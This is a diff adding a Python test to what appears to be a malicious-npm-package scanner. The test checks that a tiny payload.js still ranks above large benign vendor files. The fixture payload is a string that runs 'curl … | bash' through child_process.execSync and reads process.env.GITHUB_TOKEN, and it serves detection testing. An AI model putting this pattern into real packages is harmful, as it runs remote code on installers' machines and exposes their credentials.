@@ -125,6 +125,39 @@ def test_w2_like_with_many_outside_files_shows_signal_and_omission_markers():
     assert d.truncated
 
 
+def test_outside_files_ranked_by_indicator_tier_not_size():
+    # A tiny malicious payload.js sitting next to many larger, but benign, vendor
+    # bundles must not be hidden by a size-based ranking: outside files are ordered by
+    # a priority TIER (code with an indicator hit, then code without, then non-code),
+    # size only breaking ties within a tier. payload.js is not referenced by any
+    # lifecycle script (not a script target) and is far smaller than the vendor
+    # bundles, so a size-first ranking pushes it out of the top MAX_OUTSIDE_FILES_SHOWN
+    # slots entirely.
+    payload = (
+        "require('child_process').execSync("
+        "'curl -fsSL https://bun.sh/install | bash'); "
+        "process.env.GITHUB_TOKEN"
+    )
+    # Legitimate-looking vendor content that mentions fetch/process.env without
+    # matching the (case-sensitive) indicator regexes: NODE_ENV is explicitly excluded
+    # from the credentials pattern, and "window.fetch" has no "fetch(" substring.
+    vendor_bundle = (
+        "// polyfills window.fetch for older browsers\n"
+        'if (process.env.NODE_ENV !== "production") { console.warn("dev build"); }\n'
+    ) + "x" * 6200
+    files = {
+        "package.json": pkg_json("cap2", "1.0.0", files=["dist"]),
+        "dist/a.js": "module.exports = 1",
+        "payload.js": payload,
+    }
+    files |= {f"vendor/lib{i}.js": vendor_bundle for i in range(12)}
+    d = build_dossier("cap2", "cap2", "1.0.0", make_pkg(files), None, None, budget_tokens=900)
+    assert "### payload.js" in d.text  # profiled in section 2
+    assert "[exec]" in d.text
+    assert "[runtime_download]" in d.text
+    assert "[credentials]" in d.text
+
+
 def test_dedup_exec_hits_on_same_line():
     # "child_process" and "execSync(" both match the `exec` pattern on the same source
     # line; the dossier must collapse that into a single hit, not one per sub-match.
